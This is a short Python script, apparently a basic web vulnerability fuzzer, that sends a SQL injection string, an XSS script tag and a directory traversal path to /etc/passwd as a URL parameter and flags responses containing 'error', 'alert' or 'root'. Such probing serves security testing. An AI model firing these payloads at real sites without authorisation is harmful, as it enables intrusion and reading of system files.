import requests

def fuzz(url):
    payloads = [
        "' OR '1'='1",   # SQL Injection Fuzz
        "<script>alert('XSS')</script>",   # XSS Fuzz
        "../../../../etc/passwd",   # Directory Traversal Fuzz
    ]
    for payload in payloads:
        fuzz_url = f"{url}?input={payload}"
        try:
            response = requests.get(fuzz_url)
            print(f"Fuzzing with payload: {payload}")
            if any(vuln_indicator in response.text.lower() for vuln_indicator in ['error', 'alert', 'root']):
                print(f"Possible vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error fuzzing {url}: {e}")
